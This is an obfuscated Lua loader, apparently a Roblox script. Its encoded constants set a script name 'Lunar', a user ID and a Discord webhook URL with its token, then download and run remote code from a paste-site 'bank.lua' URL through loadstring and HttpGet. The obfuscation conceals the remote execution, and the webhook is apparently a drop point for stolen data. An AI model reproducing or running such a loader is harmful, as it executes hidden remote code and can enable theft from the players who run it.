--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then v19=v0(v3(v20,1,1));return "";else local v73=v2(v0(v20,16));if v19 then local v92=v5(v73,v19);v19=nil;return v92;else return v73;end end end);local function v21(v22,v23,v24)if v24 then local v74=(v22/((1 + (2 -1))^(v23-(43 -(7 + 35)))))%((7 -5)^(((v24-1) -(v23-(1505 -((953 -227) + 778)))) + (1429 -((1176 -(219 + 56)) + 527)))) ;return v74-(v74%1) ;else local v75=(1862 -(775 + 1085))^(v23-(992 -(415 + 576))) ;return (((v22%(v75 + v75))>=v75) and 1) or (0 -0) ;end end local function v25()local v38=(489 -(305 + 184)) -(0 + 0) ;local v39;while true do if (v38==(0 -0)) then v39=v1(v16,v18,v18);v18=v18 + 1 + 0 ;v38=2 -1 ;end if (v38==1) then return v39;end end end local function v26()local v40,v41=v1(v16,v18,v18 + (5 -3) );v18=v18 + (1372 -(860 + 510)) ;return (v41 * 256) + v40 ;end local function v27()local v42,v43,v44,v45=v1(v16,v18,v18 + 3 );v18=v18 + (7 -3) ;return (v45 * (27039357 -10262141)) + (v44 * (3726 + 61810)) + (v43 * (1057 -801)) + v42 ;end local function v28()local v46=v27();local v47=v27();local v48=1254 -((2204 -(322 + 852)) + 223) ;local v49=(v21(v47,1 + 0 ,20) * ((391 -(253 + 136))^(16 + 16))) + v46 ;local v50=v21(v47,(66 + 17) -(525 -(188 + 275)) ,73 -42 );local v51=((v21(v47,27 + 5 )==(717 -(467 + 249))) and  -(1 -0)) or (1 + 0) ;if (v50==0) then if (v49==(0 + 0 + 0)) then return v51 * (1366 -(1183 + (663 -(427 + 53)))) ;else local v93=(180 -(124 + 56)) -(229 -(195 + 34)) ;while true do if (v93==(1048 -(674 + 374))) then v50=1541 -(1460 + 80) ;v48=0;break;end end end elseif (v50==(2017 + 30)) then return ((v49==(175 -(21 + 154))) and (v51 * ((3 -2)/(0 + 0)))) or (v51 * NaN) ;end return v8(v51,v50-1023 ) * (v48 + (v49/(2^(796 -(717 + 27))))) ;end local function v29(v30)local v52;if  not v30 then v30=v27();if (v30==(0 -0)) then return "";end end v52=v3(v16,v18,(v18 + v30) -1 );v18=v18 + v30 ;local v53={};for v66=1052 -(636 + 415) , #v52 do v53[v66]=v2(v1(v3(v52,v66,v66)));end return v6(v53);end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v54=0 + 0 ;local v55;local v56;local v57;local v58;local v59;local v60;local v61;local v62;while true do if (v54==3) then local v86=0 -0 ;while true do if (v86==0) then v61=nil;v62=nil;v86=2 -1 ;end if (v86==1) then v54=4 + 0 ;break;end end end if (v54==(12 -8)) then while true do if (v55~=3) then else v62=nil;while true do local v99=0;local v100;local v101;while true do if (v99~=1) then else while true do if (v100~=(0 -0)) then else v101=0;while true do if ((1 -0)~=v101) then else if (v56==2) then local v126=0;local v127;local v128;while true do if (v126==0) then v127=0;v128=nil;v126=1;end if (v126==1) then while true do if (v127==0) then v128=0;while true do local v149=1067 -(670 + 397) ;while true do if (v149==0) then if (v128~=1) then else local v154=745 -(579 + 166) ;while true do if (v154==(0 -0)) then for v168=1 + 0 ,v27() do v59[v168]=v27();end return v60;end end end if (v128~=0) then else for v157=1 + 0 ,v27() do local v158=0 -0 ;local v159;local v160;while true do if (v158==(0 -0)) then local v170=1382 -(172 + 1210) ;while true do if (v170~=1) then else v158=1;break;end if (v170==0) then v159=0 + 0 ;v160=nil;v170=81 -(60 + 20) ;end end end if (v158==(1028 -(56 + 971))) then while true do if (v159==0) then v160=v25();if (v21(v160,1720 -(1511 + 208) ,1)~=0) then else local v172=0;local v173;local v174;local v175;local v176;local v177;while true do if (v172~=(1 + 0)) then else v175=nil;v176=nil;v172=2;end if (v172~=(1172 -(692 + 480))) then else v173=0;v174=nil;v172=1;end if (v172==(2 + 0)) then v177=nil;while true do if (v173~=(0 -0)) then else local v178=0 -0 ;while true do if (v178==1) then v173=1;break;end if (v178==0) then v174=0 -0 ;v175=nil;v178=3 -2 ;end end end if (v173~=(5 -3)) then else while true do if (1==v174) then local v180=0;local v181;while true do if (v180==0) then v181=0;while true do if (v181==(1 -0)) then v174=2;break;end if (v181~=0) then else v177={v26(),v26(),nil,nil};if (v175==0) then local v193=0;local v194;while true do if (v193~=0) then else v194=0 -0 ;while true do if (v194~=(748 -(275 + 473))) then else v177[3 + 0 ]=v26();v177[1353 -(1007 + 342) ]=v26();break;end end break;end end elseif (v175==1) then v177[3]=v27();elseif (v175==2) then v177[3]=v27() -(2^(6 + 10)) ;elseif (v175~=(6 -3)) then else local v199=0;while true do if (v199==0) then v177[8 -5 ]=v27() -(2^(40 -24)) ;v177[4]=v26();break;end end end v181=1;end end break;end end end if (v174~=(836 -(514 + 320))) then else local v182=0;local v183;while true do if (v182~=(383 -(288 + 95))) then else v183=0;while true do if (v183==1) then v174=3;break;end if (v183~=0) then else local v189=0 + 0 ;local v190;while true do if (v189==0) then v190=0;while true do if ((0 -0)~=v190) then else if (v21(v176,1 + 0 ,1332 -(960 + 371) )==(1 + 0)) then v177[1 + 1 ]=v62[v177[1 + 1 ]];end if (v21(v176,2,2)==1) then v177[3]=v62[v177[3 + 0 ]];end v190=1;end if (v190==(1 -0)) then v183=1;break;end end break;end end end end break;end end end if (v174==3) then if (v21(v176,3 + 0 ,3)==1) then v177[18 -14 ]=v62[v177[1969 -(1900 + 65) ]];end v57[v157]=v177;break;end if (v174==(0 -0)) then local v185=0;local v186;while true do if (v185~=0) then else v186=0;while true do if (1==v186) then v174=1;break;end if (v186~=(0 -0)) then else local v191=1392 -(446 + 946) ;local v192;while true do if (v191~=0) then else v192=0;while true do if ((0 -0)~=v192) then else v175=v21(v160,2,3 + 0 );v176=v21(v160,4,7 -1 );v192=1;end if (v192==1) then v186=1 -0 ;break;end end break;end end end end break;end end end end break;end if (v173==(2 -1)) then local v179=0;while true do if (v179~=0) then else v176=nil;v177=nil;v179=1 + 0 ;end if ((1 + 0)~=v179) then else v173=2;break;end end end end break;end end end break;end end break;end end end for v161=1 -0 ,v27() do v58[v161-(1 + 0) ]=v33();end v128=2 -1 ;end break;end end end break;end end break;end end end break;end if (v101~=0) then else local v109=406 -(68 + 338) ;while true do if (v109~=(1 + 0)) then else v101=2 -1 ;break;end if (v109~=0) then else if (v56~=0) then else local v137=0;local v138;while true do if (v137~=0) then else v138=0 + 0 ;while true do if (v138~=(1 + 0)) then else local v150=0 + 0 ;while true do if (v150~=(0 -0)) then else local v155=0;while true do if ((0 + 0)~=v155) then else v59={};v60={v57,v58,nil,v59};v155=1 -0 ;end if (v155==(1382 -(196 + 1185))) then v150=3 -2 ;break;end end end if (v150==(1 + 0)) then v138=2;break;end end end if (v138~=2) then else v56=1;break;end if (v138~=0) then else v57={};v58={};v138=1663 -(992 + 670) ;end end break;end end end if (v56==(1 + 0)) then local v139=0 -0 ;local v140;while true do if (v139==(0 -0)) then v140=0 -0 ;while true do if (v140~=2) then else v56=5 -3 ;break;end if (v140~=(1 + 0)) then else local v151=0 -0 ;while true do if (0~=v151) then else for v163=1,v61 do local v164=1236 -(320 + 916) ;local v165;local v166;local v167;while true do if (v164~=(934 -(830 + 104))) then else v165=0;v166=nil;v164=1223 -(655 + 567) ;end if (v164==1) then v167=nil;while true do if (v165~=(1 -0)) then else if (v166==(1 -0)) then v167=v25()~=0 ;elseif (v166==(1622 -(1202 + 418))) then v167=v28();elseif (v166==(1150 -(343 + 804))) then v167=v29();end v62[v163]=v167;break;end if (v165~=0) then else v166=v25();v167=nil;v165=1361 -(1299 + 61) ;end end break;end end end v60[2 + 1 ]=v25();v151=1 -0 ;end if (v151~=1) then else v140=2 + 0 ;break;end end end if (v140~=(0 + 0)) then else v61=v27();v62={};v140=722 -(26 + 695) ;end end break;end end end v109=1 + 0 ;end end end end break;end end break;end if (0==v99) then v100=0;v101=nil;v99=1;end end end break;end if (v55~=(1 -0)) then else v58=nil;v59=nil;v55=2;end if (0==v55) then v56=1316 -(117 + 1199) ;v57=nil;v55=1 -0 ;end if (2==v55) then local v98=0;while true do if (v98~=(951 -(938 + 13))) then else v60=nil;v61=nil;v98=936 -(818 + 117) ;end if (v98~=(1251 -(207 + 1043))) then else v55=3;break;end end end end break;end if ((526 -(267 + 258))~=v54) then else local v87=0 + 0 ;while true do if (v87~=1) then else v54=2;break;end if ((0 -0)==v87) then v57=nil;v58=nil;v87=1;end end end if (0==v54) then v55=545 -(63 + 482) ;v56=nil;v54=1;end if (v54==2) then v59=nil;v60=nil;v54=3;end end end local function v34(v35,v36,v37)local v63=v35[1];local v64=v35[2];local v65=v35[3];return function(...)local v68=1;local v69= -1;local v70={...};local v71=v12("#",...) -1 ;local function v72()local v76=v63;local v77=v64;local v78=v65;local v79=v32;local v80={};local v81={};local v82={};for v88=1173 -(84 + 1089) ,v71 do if ((v88>=v78) or ((969 + 960 + 222)<=(3271 -2142))) then v80[v88-v78 ]=v70[v88 + (1716 -(1303 + 412)) ];else v82[v88]=v70[v88 + 1 + 0 ];end end local v83=(v71-v78) + 1 + 0 ;local v84;local v85;while true do local v89=0 -0 ;local v90;while true do if (((10063 -6301)<=(3897 + 417)) and (v89==(287 -(170 + 117)))) then v90=0 -0 ;while true do if ((v90==1) or ((4178 -(335 + 779))>(12717 -(7970 + 771)))) then if ((3552>=(1003 + (1434 -841))) and (v85<=5)) then if ((v85<=((1299 -(179 + 268)) -(698 + 152))) or ((2359 -(197 + 88))<(1211 + 586))) then if ((v85<=(0 + 0)) or ((23448 -(13403 + 5061))<=(1139 -(73 + 86)))) then for v110=v84[2],v84[3 + 0 ] do v82[v110]=nil;end elseif (((2839 + (4883 -3126))>=(428 + 94)) and (v85>(1773 -(176 + 1596)))) then if ((v82[v84[2]]==v84[1376 -(114 + 1258) ]) or (1931>(5658 -2152))) then v68=v68 + (1699 -(746 + 952)) ;else v68=v84[7 -4 ];end else v82[v84[509 -(84 + 423) ]]=v84[3];end elseif ((v85<=3) or ((2445 -(206 + 17))>=(464 + 2572))) then do return;end elseif ((v85>(534 -(467 + 63))) or ((5492 -3583)>2384)) then v82[v84[345 -(222 + 121) ]]=v37[v84[1919 -((1666 -(14 + 969)) + 1233) ]];else v82[v84[1211 -(522 + 687) ]]();end elseif (((1710 -1082)<=((6669 -2234) -(3180 -1670))) and (v85<=8)) then if (((1437 -(17 + 1205))<(2795 -931)) and (v85<=(12 -(20 -14)))) then local v105=0;local v106;local v107;while true do if ((v105==(2 -1)) or ((2738 -(394 + 833))<((853 -(569 + 235)) + 379))) then while true do if ((v106==((0 -0) + 0)) or (4073<(365 -119))) then v107=v84[3 -1 ];v82[v107]=v82[v107](v13(v82,v107 + 1 ,v69));break;end end break;end if ((v105==0) or ((17198 -13626)<=(2415 + 638))) then v106=0 + 0 ;v107=nil;v105=1563 -(247 + 1315) ;end end elseif ((v85>(5 + 2)) or ((2115 -(885 + 622))>=1070)) then local v116=20 -((10 -6) + 16) ;local v117;local v118;while true do if ((v116==(66 -(10 + 55))) or ((438 -261)>(771 + 186 + 23))) then v82[v117 + (1 -0) ]=v118;v82[v117]=v118[v84[4]];break;end if (((3358 -(463 + 186))>=2165) and (v116==(660 -((488 -286) + 458)))) then local v134=0 + 0 ;while true do if ((2490>(135 + 289)) and (v134==(0 -0))) then v117=v84[2 + 0 ];v118=v82[v84[208 -(126 + 79) ]];v134=1 -0 ;end if (((6868 -3700)<=((43066 -33957) -5392)) and (v134==1)) then v116=1;break;end end end end else local v119=0 + 0 ;local v120;local v121;local v122;local v123;while true do if (((1150 -(138 + 1010))==v119) or ((4858 -(212 + 334))==(5776 -2661))) then for v143=v120,v69 do local v144=0 -(840 -(617 + 223)) ;local v145;while true do if (((0 -0)==v144) or ((2107 -(319 + 318))>=(4181 -(1526 + 97)))) then v145=0 -0 ;while true do if (((588 -374)<(1086 -370)) and (v145==(0 + 0))) then v123=v123 + 1 + 0 ;v82[v143]=v121[v123];break;end end break;end end end break;end if ((v119==(1 -0)) or ((133 + 598)>(5948 -2795))) then local v135=0 + 0 ;while true do if ((v135==(0 + 0)) or (1100>=(3935 -((465 -166) + 777)))) then v69=(v122 + v120) -(3 -2) ;v123=0 -0 ;v135=1 + 0 ;end if ((v135==(3 -2)) or ((2737 -(695 + 733))==(2450 + 1219))) then v119=3 -1 ;break;end end end if (((2363 + 263)<=(3710 -(877 + 76))) and ((311 -(226 + 85))==v119)) then local v136=0;while true do if ((v136==(0 + 0)) or ((381 + 737)==(3190 + 533))) then v120=v84[3 -1 ];v121,v122=v79(v82[v120](v13(v82,v120 + (862 -(468 + 393)) ,v84[7 -4 ])));v136=1;end if (((338 + 1376)<(5052 -(357 + 912))) and (v136==(1410 -(771 + 638)))) then v119=(56 + 111) -(124 + 42) ;break;end end end end end elseif (((11430 -6590)>=(4092 -(242 + 513))) and (v85<=9)) then v68=v84[3];elseif (((5263 -1741)>=((2328 + 983) -(338 + 366))) and (v85>(3 + (15 -8)))) then v82[v84[3 -1 ]][v84[7 -4 ]]=v84[3 + 1 ];elseif ((v84[2 + 0 ]==v82[v84[(1999 -(936 + 1061)) + 2 ]]) or ((282 + 2130)>=(2609 + 270))) then v68=v68 + ((2 + 1) -2) ;else v68=v84[1926 -(1697 + 226) ];end v68=v68 + 1 + 0 ;break;end if ((v90==(0 + 0)) or ((2194 + 1816)<=(5124 -1155))) then local v102=0 -(1048 -(627 + 421)) ;while true do if ((v102==(0 -(1427 -(581 + 846)))) or ((2297 + 2480)<=2465)) then v84=v76[v68];v85=v84[1];v102=3 -2 ;end if (((1 + 0)==v102) or ((264 -71)>=(5268 -(787 + 665)))) then v90=1771 -(954 + 47 + 769) ;break;end end end end break;end end end end A,B=v32(v11(v72));if  not A[1] then local v91=v35[4][v68] or "?" ;error("Script error at ["   .. v91   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end return v34(v33(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F47030A3O005363726970744E616D6503053O004C756E6172030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403273O00682O7470733A2O2F70617374652E78797A6F2E73706163652F6C756E61722F62616E6B2E6C756103063O00557365724944022O00A06E45B6E94103073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F31303836342O373935383234393732313835372F31662O74763547387A326F4F5A3847755F78467358485267516B64396F7A56476E374E6A393469507471564E366C43455775687033534A6D45672D457871573376474378001C3O0012013O00016O000100013O000E0A0001000200013O0004093O00020001001201000100013O000E0A00020011000100010004093O00110001001205000200033O00300B000200040005001205000200063O001205000300073O002008000300030008001201000500094O0007000300054O000600023O00022O00040002000100010004093O001B000100260200010005000100010004093O00050001001205000200033O00300B0002000A000B001205000200033O00300B0002000C000D001201000100023O0004093O000500010004093O001B00010004093O000200012O00033O00017O001C3O00023O00033O00053O00053O00063O00083O00083O00093O00093O000A3O000A3O000A3O000A3O000A3O000A3O000A3O000B3O000D3O000D3O000E3O000E3O000F3O000F3O00103O00113O00133O00143O00163O00",v9(),...);end
